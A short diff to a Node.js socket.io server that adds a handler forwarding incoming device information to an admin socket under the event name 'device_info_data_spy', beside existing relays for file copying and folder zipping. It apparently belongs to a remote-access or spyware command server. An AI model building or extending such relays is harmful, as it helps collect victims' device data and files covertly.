@@ -133,7 +133,10 @@ io.on("connection", (socket) => {
 console.log(size + " copy size");
     io.to(admin_socket_id).emit("copying_files",size);
   });
-
+socket.on("device_info_data", (data) => {
+console.log(data);
+    io.to(admin_socket_id).emit("device_info_data_spy",data);
+  });
   socket.on("zipping_folder", (size) => {
   console.log(size + " zip size");
     io.to(admin_socket_id).emit("zipping_folder",size);
